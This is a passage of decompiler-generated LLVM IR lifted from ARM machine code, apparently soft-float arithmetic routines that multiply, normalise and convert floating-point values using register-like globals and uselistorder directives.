  %v2_12f10 = and i32 %v2_12f04, 32768
  %v3_12f10 = icmp ne i32 %v2_12f10, 0
  %v4_12f10 = udiv i32 %v2_12f04, 65536
  %v7_12f10 = zext i1 %v3_12f10 to i32
  %v8_12f10 = add nuw nsw i32 %v7_12f10, %v4_12f10
  %v2_12f14 = mul i32 %v6_12ee0, %v3_12ec4
  %v2_12f1c = and i32 %v2_12f14, 32768
  %v3_12f1c = icmp ne i32 %v2_12f1c, 0
  %v4_12f1c = udiv i32 %v2_12f14, 65536
  %v6_12f1c = add nuw nsw i32 %v8_12f10, %v4_12f1c
  %v7_12f1c = zext i1 %v3_12f1c to i32
  %v8_12f1c = add nuw nsw i32 %v6_12f1c, %v7_12f1c
  %v2_12f20 = mul i32 %v3_12ec8, %v6_12edc
  %v2_12f28 = and i32 %v2_12f20, 32768
  %v3_12f28 = icmp ne i32 %v2_12f28, 0
  %v4_12f28 = udiv i32 %v2_12f20, 65536
  %v6_12f28 = add nuw nsw i32 %v8_12f1c, %v4_12f28
  %v7_12f28 = zext i1 %v3_12f28 to i32
  %v8_12f28 = add nuw nsw i32 %v6_12f28, %v7_12f28
  %v2_12f2c = mul i32 %v6_12ed8, %v3_12ecc
  %v4_12f30 = mul i32 %v2_12f2c, 65536
  %tmp55 = add i32 %v2_12f14, %v2_12f04
  %tmp56 = add i32 %tmp55, %v2_12f20
  %tmp57 = mul i32 %tmp56, 65536
  %v8_12f00 = add nuw nsw i32 %v7_12ef4, %v4_12ef4
  %v5_12f0c = add nuw nsw i32 %v8_12f00, %v4_12f00
  %v5_12f18 = add nuw nsw i32 %v5_12f0c, %v7_12f00
  %v5_12f24 = add i32 %v5_12f18, %v4_12f30
  %v5_12f30 = add i32 %v5_12f24, %tmp57
  %v2_12f34 = and i32 %v2_12f2c, 32768
  %v3_12f34 = icmp ne i32 %v2_12f34, 0
  %v4_12f34 = udiv i32 %v2_12f2c, 65536
  %v6_12f34 = add nuw nsw i32 %v8_12f28, %v4_12f34
  %v7_12f34 = zext i1 %v3_12f34 to i32
  %v8_12f34 = add i32 %v6_12f34, %v7_12f34
  %v2_12f38 = mul i32 %v3_12ed0, %v6_12edc
  %v2_12f3c = mul nuw i32 %v3_12ed0, %v3_12ecc
  %v4_12f40 = mul i32 %v2_12f38, 65536
  %v5_12f40 = add i32 %v8_12f34, %v4_12f40
  %v2_12f44 = and i32 %v2_12f38, 32768
  %v3_12f44 = icmp ne i32 %v2_12f44, 0
  %v4_12f44 = udiv i32 %v2_12f38, 65536
  %v6_12f44 = add i32 %v4_12f44, %v2_12f3c
  %v7_12f44 = zext i1 %v3_12f44 to i32
  %v2_12f48 = mul i32 %v6_12ee0, %v3_12ecc
  %v4_12f4c = mul i32 %v2_12f48, 65536
  %v5_12f4c = add i32 %v5_12f40, %v4_12f4c
  %v2_12f50 = and i32 %v2_12f48, 32768
  %v3_12f50 = icmp ne i32 %v2_12f50, 0
  %v4_12f50 = udiv i32 %v2_12f48, 65536
  %v7_12f50 = zext i1 %v3_12f50 to i32
  %v2_12f54 = mul i32 %v6_12ed4, %v6_12ee0
  %v2_12f58 = add i32 %v2_12f54, %v5_12f30
  %v3_12f58 = icmp ult i32 %v2_12f58, %v5_12f30
  %v2_12f5c = mul nuw i32 %v3_12ec4, %v3_12ed0
  %v3_12f60 = add i32 %v5_12f4c, %v2_12f5c
  %v4_12f60 = zext i1 %v3_12f58 to i32
  %v5_12f60 = add i32 %v4_12f60, %v3_12f60
  %v9_12f60 = icmp ule i32 %v5_12f60, %v5_12f4c
  %v10_12f60 = icmp ult i32 %v3_12f60, %v5_12f4c
  %v11_12f60 = select i1 %v3_12f58, i1 %v9_12f60, i1 %v10_12f60
  %v2_12f64 = mul i32 %v6_12ed8, %v6_12edc
  %v2_12f68 = zext i1 %v11_12f60 to i32
  %v2_12f6c = add i32 %v2_12f64, %v2_12f58
  %v3_12f6c = icmp ult i32 %v2_12f6c, %v2_12f58
  %v0_12f70 = load i32, i32* %sb.global-to-local, align 4
  %v1_12f70 = load i32, i32* %r8.global-to-local, align 4
  %v2_12f70 = mul i32 %v1_12f70, %v0_12f70
  %v3_12f74 = add i32 %v2_12f70, %v5_12f60
  %v4_12f74 = zext i1 %v3_12f6c to i32
  %v5_12f74 = add i32 %v4_12f74, %v3_12f74
  %v9_12f74 = icmp ule i32 %v5_12f74, %v5_12f60
  %v10_12f74 = icmp ult i32 %v3_12f74, %v5_12f60
  %v11_12f74 = select i1 %v3_12f6c, i1 %v9_12f74, i1 %v10_12f74
  %v2_12f78 = mul i32 %v1_12f70, %v3_12ec4
  %v2_12f7c = zext i1 %v11_12f74 to i32
  %v8_12f44 = add i32 %v6_12f44, %v4_12f50
  %v6_12f50 = add i32 %v8_12f44, %v7_12f44
  %v8_12f50 = add i32 %v6_12f50, %v7_12f50
  %v3_12f68 = add i32 %v8_12f50, %v2_12f68
  %v3_12f7c = add i32 %v3_12f68, %v2_12f7c
  %v2_12f80 = add i32 %v2_12f78, %v2_12f6c
  store i32 %v2_12f80, i32* %lr.global-to-local, align 4
  %v3_12f80 = icmp ult i32 %v2_12f80, %v2_12f6c
  %v1_12f84 = load i32, i32* %r2.global-to-local, align 4
  %v2_12f84 = mul i32 %v1_12f84, %v6_12edc
  %v3_12f88 = add i32 %v5_12f74, %v2_12f84
  %v4_12f88 = zext i1 %v3_12f80 to i32
  %v5_12f88 = add i32 %v4_12f88, %v3_12f88
  %v9_12f88 = icmp ule i32 %v5_12f88, %v5_12f74
  %v10_12f88 = icmp ult i32 %v3_12f88, %v5_12f74
  %v11_12f88 = select i1 %v3_12f80, i1 %v9_12f88, i1 %v10_12f88
  %v2_12f8c = zext i1 %v11_12f88 to i32
  %v3_12f8c = add i32 %v2_12f8c, %v3_12f7c
  %v2_12f90 = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_12ec0, i32* %r8.global-to-local, align 4
  store i32 %v12_12ec0, i32* %sb.global-to-local, align 4
  %v0_12f94 = load i32, i32* %ip.global-to-local, align 4
  %v2_12f94 = icmp eq i32 %v0_12f94, 0
  br i1 %v2_12f94, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_12ebc
  %v2_12f98 = or i32 %v2_12f80, 1
  store i32 %v2_12f98, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_12ebc, %bb44
  %v0_12fac = phi i32 [ %v2_12f80, %dec_label_pc_12ebc ], [ %v2_12f98, %bb44 ]
  %v0_12f9c = load i32, i32* %r4.global-to-local, align 4
  %v1_12f9c = add i32 %v0_12f9c, -255
  %v2_12fa0 = icmp ugt i32 %v3_12f8c, 511
  %v2_12fa4 = icmp eq i1 %v2_12fa0, false
  %v5_12fa4 = sext i1 %v2_12fa4 to i32
  %v3_12fa4 = add nsw i32 %v5_12fa4, -1023
  %v6_12fa4 = add i32 %v3_12fa4, %v0_12f9c
  store i32 %v6_12fa4, i32* %r4.global-to-local, align 4
  %v3_12fa8 = icmp ugt i32 %v1_12f9c, 768
  br i1 %v3_12fa8, label %dec_label_pc_12fb8, label %dec_label_pc_12fac

dec_label_pc_12fac:                               ; preds = %bb45
  %v1_12fac = icmp slt i32 %v0_12fac, 0
  %v2_12fac = mul i32 %v0_12fac, 2
  store i32 %v2_12fac, i32* %lr.global-to-local, align 4
  %v3_12fb0 = mul i32 %v5_12f88, 2
  %v4_12fb0 = zext i1 %v1_12fac to i32
  %v5_12fb0 = or i32 %v4_12fb0, %v3_12fb0
  %v9_12fb0 = icmp ule i32 %v5_12fb0, %v5_12f88
  %v10_12fb0 = icmp ult i32 %v3_12fb0, %v5_12f88
  %v11_12fb0 = select i1 %v1_12fac, i1 %v9_12fb0, i1 %v10_12fb0
  %v3_12fb4 = mul i32 %v3_12f8c, 2
  %v4_12fb4 = zext i1 %v11_12fb0 to i32
  %v5_12fb4 = or i32 %v4_12fb4, %v3_12fb4
  br label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %bb45, %dec_label_pc_12fac
  %v0_12fc8 = phi i32 [ %v0_12fac, %bb45 ], [ %v2_12fac, %dec_label_pc_12fac ]
  %v0_12fc0 = phi i32 [ %v5_12f88, %bb45 ], [ %v5_12fb0, %dec_label_pc_12fac ]
  %v1_12fb8 = phi i32 [ %v3_12f8c, %bb45 ], [ %v5_12fb4, %dec_label_pc_12fac ]
  %v4_12fb8 = mul i32 %v1_12fb8, 2048
  %v4_12fbc = udiv i32 %v0_12fc0, 2097152
  %v5_12fb8 = or i32 %v4_12fbc, %v2_12f90
  %v5_12fbc = or i32 %v5_12fb8, %v4_12fb8
  store i32 %v5_12fbc, i32* %r0.global-to-local, align 4
  %v3_12fc0 = mul i32 %v0_12fc0, 2048
  %v4_12fc4 = udiv i32 %v0_12fc8, 2097152
  %v5_12fc4 = or i32 %v3_12fc0, %v4_12fc4
  store i32 %v5_12fc4, i32* %r1.global-to-local, align 4
  %v3_12fc8 = mul i32 %v0_12fc8, 2048
  store i32 %v3_12fc8, i32* %lr.global-to-local, align 4
  %v1_12fcc = add i32 %v6_12fa4, -253
  store i32 %v1_12fcc, i32* %ip.global-to-local, align 4
  %v2_12fcc = icmp ugt i32 %v6_12fa4, 252
  %v7_12fcc = icmp eq i32 %v6_12fa4, 253
  %v2_12fd0 = xor i1 %v7_12fcc, true
  %v3_12fd0 = and i1 %v2_12fcc, %v2_12fd0
  br i1 %v3_12fd0, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_12fb8
  %v6_12fd0 = icmp ugt i32 %v1_12fcc, 1791
  %v11_12fd0 = icmp eq i32 %v1_12fcc, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_12fb8, %bb46
  %v1_12fd4 = phi i1 [ %v7_12fcc, %dec_label_pc_12fb8 ], [ %v11_12fd0, %bb46 ]
  %v0_12fd4 = phi i1 [ %v2_12fcc, %dec_label_pc_12fb8 ], [ %v6_12fd0, %bb46 ]
  %v2_12fd4 = xor i1 %v1_12fd4, true
  %v3_12fd4 = and i1 %v0_12fd4, %v2_12fd4
  call void @__pseudo_cond_branch(i1 %v3_12fd4, i32 ptrtoint (i32* @global_var_13018.766 to i32))
  %v0_12fd8 = load i32, i32* %lr.global-to-local, align 4
  %v2_12fd8 = icmp slt i32 %v0_12fd8, 0
  %v6_12fd8 = icmp eq i32 %v0_12fd8, -2147483648
  %v1_12fdc = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_12fd8, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_12fdc = urem i32 %v1_12fdc, 2
  %v3_12fdc = icmp ne i32 %v2_12fdc, 0
  %v4_12fdc = udiv i32 %v1_12fdc, 2
  store i32 %v4_12fdc, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_12fe0 = phi i1 [ %v3_12fdc, %bb48 ], [ %v2_12fd8, %bb47 ]
  %v2_12fe0 = zext i1 %v1_12fe0 to i32
  %v3_12fe0 = add i32 %v2_12fe0, %v1_12fdc
  store i32 %v3_12fe0, i32* %r1.global-to-local, align 4
  %v0_12fe4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12fe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12fe4 = and i32 %v1_12fe4, 4096
  %v3_12fe4 = icmp ne i32 %v2_12fe4, 0
  %v4_12fe4 = mul i32 %v1_12fe4, 1048576
  %v6_12fe4 = add i32 %v4_12fe4, %v0_12fe4
  %v7_12fe4 = zext i1 %v3_12fe4 to i32
  %v8_12fe4 = add i32 %v7_12fe4, %v6_12fe4
  store i32 %v8_12fe4, i32* %r0.global-to-local, align 4
  %v2_12fe8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12fe8, i32* %r4.global-to-local, align 4
  ret i32 %v8_12fe4

dec_label_pc_12fec:                               ; preds = %.thread, %bb43
  %v1_12fec22 = phi i32 [ %v1_12fec19, %.thread ], [ %v1_12fec, %bb43 ]
  %v1_12eb421 = phi i32 [ %v1_12eb418, %.thread ], [ %v1_12eb4, %bb43 ]
  %v1_12eb020 = phi i32 [ %v1_12eb017, %.thread ], [ %v1_12eb0, %bb43 ]
  %v2_12ff0 = or i32 %v1_12eb020, %v1_12fec22
  %v2_12ff4 = or i32 %arg4, %arg2
  store i32 %v2_12ff4, i32* %r1.global-to-local, align 4
  %v2_12ff8 = xor i32 %v2_12ff0, %v1_12eb421
  store i32 %v2_12ff8, i32* %r0.global-to-local, align 4
  %v4_12ffc = udiv i32 %v1_12ea0, 2
  %v5_12ffc = sub i32 %v2_12e98, %v4_12ffc
  store i32 %v5_12ffc, i32* %r4.global-to-local, align 4
  %v7_12ffc = sub i32 0, %v5_12ffc
  %v8_12ffc = and i32 %v2_12e98, %v7_12ffc
  %v11_12ffc = icmp eq i32 %v2_12e98, %v4_12ffc
  %v7_13000 = icmp sgt i32 %v2_12e98, %v4_12ffc
  br i1 %v7_13000, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_12fec
  %v10_13000 = sub i32 %v1_12ea0, %v5_12ffc
  %v12_13000 = xor i32 %v5_12ffc, %v1_12ea0
  %v13_13000 = xor i32 %v10_13000, %v1_12ea0
  %v14_13000 = and i32 %v13_13000, %v12_13000
  %v17_13000 = icmp eq i32 %v1_12ea0, %v5_12ffc
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_12fec, %bb49
  %v2_13008.in = phi i32 [ %v8_12ffc, %dec_label_pc_12fec ], [ %v14_13000, %bb49 ]
  %v1_13008.in = phi i32 [ %v5_12ffc, %dec_label_pc_12fec ], [ %v10_13000, %bb49 ]
  %v0_13008 = phi i1 [ %v11_12ffc, %dec_label_pc_12fec ], [ %v17_13000, %bb49 ]
  %v1_13008 = icmp slt i32 %v1_13008.in, 0
  %v2_13008 = icmp slt i32 %v2_13008.in, 0
  %v3_13004 = xor i1 %v2_13008, %v1_13008
  %v4_13004 = or i1 %v0_13008, %v3_13004
  br i1 %v4_13004, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1300428 = mul i32 %v5_12ffc, 1048576
  %v10_1300429 = or i32 %v2_12ff8, %v9_1300428
  store i32 %v10_1300429, i32* %r0.global-to-local, align 4
  %v7_13008 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_13008, i32* %r4.global-to-local, align 4
  ret i32 %v10_1300429

bb52:                                             ; preds = %bb50
  %v1_1300c = or i32 %v2_12ff8, 1048576
  store i32 %v1_1300c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_13014 = add i32 %v5_12ffc, -1
  store i32 %v1_13014, i32* %r4.global-to-local, align 4
  ret i32 %v1_1300c

; uselistorder directives
  uselistorder i32 %v5_12ffc, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_12ffc, { 2, 1, 0 }
  uselistorder i32 %v2_12ff8, { 1, 0, 2 }
  uselistorder i32 %v1_12fdc, { 2, 0, 1 }
  uselistorder i32 %v0_12fd8, { 1, 0 }
  uselistorder i1 %v7_12fcc, { 1, 0 }
  uselistorder i32 %v2_12fac, { 1, 0 }
  uselistorder i1 %v1_12fac, { 1, 0 }
  uselistorder i32 %v6_12fa4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_12fac, { 1, 0, 2 }
  uselistorder i32 %v3_12f8c, { 1, 0, 2 }
  uselistorder i32 %v5_12f88, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_12f88, { 1, 0 }
  uselistorder i1 %v3_12f80, { 1, 0 }
  uselistorder i32 %v5_12f74, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12f74, { 1, 0 }
  uselistorder i1 %v3_12f6c, { 1, 0 }
  uselistorder i32 %v2_12f6c, { 1, 0, 2 }
  uselistorder i32 %v5_12f60, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12f60, { 1, 0 }
  uselistorder i1 %v3_12f58, { 1, 0 }
  uselistorder i32 %v2_12f58, { 1, 0, 2 }
  uselistorder i32 %v5_12f4c, { 2, 1, 0 }
  uselistorder i32 %v2_12f48, { 1, 2, 0 }
  uselistorder i32 %v2_12f38, { 0, 2, 1 }
  uselistorder i32 %v5_12f30, { 1, 0 }
  uselistorder i32 %v2_12f2c, { 1, 2, 0 }
  uselistorder i32 %v2_12f20, { 1, 0, 2 }
  uselistorder i32 %v2_12f14, { 1, 0, 2 }
  uselistorder i32 %v2_12f04, { 1, 0, 2 }
  uselistorder i32 %v2_12ef8, { 0, 2, 1 }
  uselistorder i32 %v2_12ee8, { 1, 0, 2 }
  uselistorder i32 %v6_12ee0, { 1, 0, 2, 3 }
  uselistorder i32 %v6_12edc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_12ed4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_12ed0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_12ecc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_12ec8, { 3, 2, 0, 1 }
  uselistorder i32 %v3_12ec4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_12eb4, { 1, 0, 2 }
  uselistorder i32 %v1_12eb0, { 1, 0, 2 }
  uselistorder i32 %v6_12ea4, { 0, 2, 1, 3 }
  uselistorder i32 %v6_12ea0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12ea0, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_12e9c, { 1, 0 }
  uselistorder i32 %v2_12e98, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_12e88, { 2, 1, 0 }
  uselistorder i32 %v5_12e84, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 0, 13 }
  uselistorder i32 65536, { 2, 0, 3, 56, 4, 57, 1, 5, 6, 7, 8, 58, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* @sb, { 30, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 0, 37 }
  uselistorder i32* @r8, { 79, 15, 16, 17, 18, 19, 20, 21, 5, 6, 7, 22, 27, 28, 0, 29, 64, 65, 66, 67, 1, 68, 69, 70, 71, 90, 91, 8, 9, 10, 11, 12, 13, 14, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 3, 4, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 86, 87, 88, 89, 23, 24, 25, 26 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_12fec, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_12fb8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_13018(i32 %arg1) local_unnamed_addr {
dec_label_pc_13018:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_13018 = load i1, i1* @cpsr_z, align 1
  %v1_13018 = load i1, i1* @cpsr_n, align 1
  %v2_13018 = load i1, i1* @cpsr_v, align 1
  %v3_13018 = xor i1 %v1_13018, %v2_13018
  %v4_13018 = or i1 %v0_13018, %v3_13018
  br i1 %v4_13018, label %dec_label_pc_1301c, label %dec_label_pc_13180

dec_label_pc_1301c:                               ; preds = %dec_label_pc_13018
  %v0_1301c = load i32, i32* @r4, align 4
  %v4_1301c = add i32 %v0_1301c, 54
  %v6_1301c = sub i32 0, %v0_1301c
  %v7_1301c = and i32 %v4_1301c, %v6_1301c
  %v8_1301c = icmp slt i32 %v7_1301c, 0
  store i1 %v8_1301c, i1* @cpsr_v, align 1
  %v9_1301c = icmp slt i32 %v4_1301c, 0
  store i1 %v9_1301c, i1* @cpsr_n, align 1
  %v10_1301c = icmp eq i32 %v4_1301c, 0
  store i1 %v10_1301c, i1* @cpsr_z, align 1
  %v7_13020 = icmp sgt i32 %v0_1301c, -54
  br i1 %v7_13020, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1301c
  store i32 0, i32* @r1, align 4
  %v8_13024 = load i32, i32* %r0.global-to-local, align 4
  %v9_13024 = and i32 %v8_13024, -2147483648
  store i32 %v9_13024, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_13024

bb6:                                              ; preds = %dec_label_pc_1301c
  %v1_1302c = sub i32 0, %v0_1301c
  %v2_13030 = sub i32 -32, %v0_1301c
  %v4_13030 = add i32 %v0_1301c, 31
  %v5_13030 = and i32 %v4_13030, %v1_1302c
  %v6_13030 = icmp slt i32 %v5_13030, 0
  store i1 %v6_13030, i1* @cpsr_v, align 1
  %v6_13034 = icmp slt i32 %v1_1302c, 32
  br i1 %v6_13034, label %dec_label_pc_13038, label %dec_label_pc_1309c

dec_label_pc_13038:                               ; preds = %bb6
  %v1_13038 = add i32 %v2_13030, 12
  %v8_1303c = icmp sgt i32 %v1_13038, 0
  br i1 %v8_1303c, label %dec_label_pc_13070, label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_13038
  %v1_13040 = add i32 %v2_13030, 32
  %v1_13044 = sub i32 0, %v2_13030
  %v0_13048 = load i32, i32* @r1, align 4
  %v6_13048 = shl i32 %v0_13048, %v1_13044
  %v2_1304c = add i32 %v2_13030, 31
  %v3_1304c = shl i32 1, %v2_1304c
  %v6_1304c = lshr i32 %v0_13048, %v1_13040
  %v1_13050 = load i32, i32* %r0.global-to-local, align 4
  %v7_13050 = shl i32 %v1_13050, %v1_13044
  %v8_13050 = or i32 %v7_13050, %v6_1304c
  %v1_13054 = and i32 %v1_13050, -2147483648
  %tmp = bitcast i32 %v1_13050 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_13058 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_13048, 0
  %v4_1305c = zext i1 %tmp14 to i32
  %v5_1305c = add i32 %v8_13050, %v4_1305c
  store i32 %v5_1305c, i32* @r1, align 4
  %v5_13060 = and i32 %v1_13058, %v3_1304c
  %v6_13060 = icmp ne i32 %v5_13060, 0
  %v7_13060 = lshr i32 %v1_13058, %v1_13040
  %v9_13060 = add i32 %v7_13060, %v1_13054
  %v10_13060 = zext i1 %v6_13060 to i32
  %v11_13060 = add i32 %v9_13060, %v10_13060
  store i32 %v11_13060, i32* %r0.global-to-local, align 4
  %v19_13060 = add i32 %v11_13060, %v10_13060
  %v20_13060 = xor i32 %v19_13060, %v1_13050
  %v21_13060 = xor i32 %v19_13060, %v7_13060
  %v22_13060 = and i32 %v20_13060, %v21_13060
  %v23_13060 = icmp slt i32 %v22_13060, 0
  store i1 %v23_13060, i1* @cpsr_v, align 1
  %v0_13064 = load i32, i32* @lr, align 4
  %v3_13064 = mul i32 %v6_13048, 2
  %v4_13064 = or i32 %v0_13064, %v3_13064
  %v5_13064 = icmp slt i32 %v4_13064, 0
  store i1 %v5_13064, i1* @cpsr_n, align 1
  %v6_13064 = icmp eq i32 %v4_13064, 0
  store i1 %v6_13064, i1* @cpsr_z, align 1
  br i1 %v6_13064, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_13040
  %tmp15 = sext i1 %tmp14 to i32
  %v6_13068 = add nsw i32 %tmp15, -1
  %v7_13068 = and i32 %v5_1305c, %v6_13068
  store i32 %v7_13068, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_13040, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_13060

dec_label_pc_13070:                               ; preds = %dec_label_pc_13038
  %v1_13070 = sub i32 0, %v2_13030
  %v1_13074 = add i32 %v2_13030, 32
  %v0_13078 = load i32, i32* @r1, align 4
  %v6_13078 = shl i32 %v0_13078, %v1_13070
  %v6_1307c = lshr i32 %v0_13078, %v1_13074
  %v1_13080 = load i32, i32* %r0.global-to-local, align 4
  %v7_13080 = shl i32 %v1_13080, %v1_13070
  %v8_13080 = or i32 %v7_13080, %v6_1307c
  %v1_13084 = and i32 %v1_13080, -2147483648
  %tmp16 = icmp slt i32 %v6_13078, 0
  %v4_13088 = zext i1 %tmp16 to i32
  %v5_13088 = add i32 %v8_13080, %v4_13088
  store i32 %v5_13088, i32* @r1, align 4
  %v6_13088 = icmp ult i32 %v5_13088, %v8_13080
  %v2_1308c = zext i1 %v6_13088 to i32
  %v3_1308c = or i32 %v2_1308c, %v1_13084
  store i32 %v3_1308c, i32* %r0.global-to-local, align 4
  %v9_1308c = add nsw i32 %v3_1308c, %v2_1308c
  %v10_1308c = sub i32 0, %v1_13080
  %v11_1308c = and i32 %v9_1308c, %v10_1308c
  %v12_1308c = icmp slt i32 %v11_1308c, 0
  store i1 %v12_1308c, i1* @cpsr_v, align 1
  %v0_13090 = load i32, i32* @lr, align 4
  %v3_13090 = mul i32 %v6_13078, 2
  %v4_13090 = or i32 %v0_13090, %v3_13090
  %v5_13090 = icmp slt i32 %v4_13090, 0
  store i1 %v5_13090, i1* @cpsr_n, align 1
  %v6_13090 = icmp eq i32 %v4_13090, 0
  store i1 %v6_13090, i1* @cpsr_z, align 1
  br i1 %v6_13090, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_13070
  %tmp17 = sext i1 %tmp16 to i32
  %v6_13094 = add nsw i32 %tmp17, -1
  %v7_13094 = and i32 %v5_13088, %v6_13094
  store i32 %v7_13094, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_13070, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1308c

dec_label_pc_1309c:                               ; preds = %bb6
  %v1_1309c = sub i32 32, %v2_13030
  %v0_130a0 = load i32, i32* @lr, align 4
  %v1_130a0 = load i32, i32* @r1, align 4
  %v7_130a0 = shl i32 %v1_130a0, %v1_1309c
  %v8_130a0 = or i32 %v7_130a0, %v0_130a0
  %v6_130a4 = lshr i32 %v1_130a0, %v2_13030
  %v1_130a8 = load i32, i32* %r0.global-to-local, align 4
  %v7_130a8 = shl i32 %v1_130a8, %v1_1309c
  %v8_130a8 = or i32 %v7_130a8, %v6_130a4
  %v6_130ac = lshr i32 %v1_130a8, %v2_13030
  %v1_130b0 = and i32 %v1_130a8, -2147483648
  store i32 %v1_130b0, i32* %r0.global-to-local, align 4
  %v7_130b4 = lshr i32 %v1_130b0, %v2_13030
  %v8_130b4 = sub i32 -1, %v7_130b4
  %v9_130b4 = and i32 %v6_130ac, %v8_130b4
  %tmp18 = icmp slt i32 %v8_130a8, 0
  %v4_130b8 = zext i1 %tmp18 to i32
  %v5_130b8 = add i32 %v4_130b8, %v9_130b4
  store i32 %v5_130b8, i32* @r1, align 4
  %v3_130bc = mul i32 %v8_130a8, 2
  %v4_130bc = or i32 %v8_130a0, %v3_130bc
  %v5_130bc = icmp slt i32 %v4_130bc, 0
  store i1 %v5_130bc, i1* @cpsr_n, align 1
  %v6_130bc = icmp eq i32 %v4_130bc, 0
  store i1 %v6_130bc, i1* @cpsr_z, align 1
  br i1 %v6_130bc, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1309c
  %tmp19 = sext i1 %tmp18 to i32
  %v6_130c0 = add nsw i32 %tmp19, -1
  %v7_130c0 = and i32 %v5_130b8, %v6_130c0
  store i32 %v7_130c0, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1309c, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_130b0

dec_label_pc_13180:                               ; preds = %dec_label_pc_13018
  %v0_13180 = load i32, i32* %r0.global-to-local, align 4
  %v1_13180 = and i32 %v0_13180, -2147483648
  %v1_13188 = or i32 %v1_13180, 2146435072
  store i32 %v1_13188, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_13188

; uselistorder directives
  uselistorder i32 %v3_1308c, { 2, 0, 1 }
  uselistorder i32 %v8_13080, { 1, 0 }
  uselistorder i32 %v1_13070, { 1, 0 }
  uselistorder i32 %v11_13060, { 1, 0, 2 }
